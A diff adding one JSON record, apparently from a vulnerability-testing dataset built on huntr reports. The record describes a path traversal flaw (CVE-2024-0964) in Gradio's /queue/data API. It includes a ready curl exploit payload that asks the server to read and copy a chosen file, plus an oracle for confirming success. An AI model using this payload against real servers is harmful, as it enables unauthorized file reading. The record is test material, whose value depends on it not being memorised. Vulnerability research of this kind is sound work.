@@ -1,0 +1,15 @@
+{
+  "file_id": "334_gradio_huntr_25e25501-5918-429c-8541-88832dfd3741",
+  "numeric_id": "334",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Arbitrary file reading due to lack of input filepath validation in Gradio's /queue/data API",
+  "cve": "CVE-2024-0964",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "gradio",
+  "affected_version": "< 4.18.0",
+  "vulnerable_function": "save_file_to_cache",
+  "triggerability": "direct",
+  "trigger_payload": "curl -X POST {BASE_URL}/queue/data -H \"Content-Type: application/json\" -d '{\"data\": [[{\"path\": \"/tmp/gradio/1acfd6abf072610f1da06229316c79545c63e870/test.csv\", \"url\": \"http://127.0.0.1:7860/file=/tmp/gradio/1acfd6abf072610f1da06229316c79545c63e870/test.csv\", \"orig_name\": \"test.csv\", \"size\": 51, \"mime_type\": \"\"}]], \"event_data\": null, \"fn_index\": 0, \"trigger_id\": 8, \"session_hash\": \"\", \"event_id\": \"...\"}'",
+  "oracle": "The file is available at: http://127.0.0.1:7860/file=temp_path_to_the_copied_file"
+}
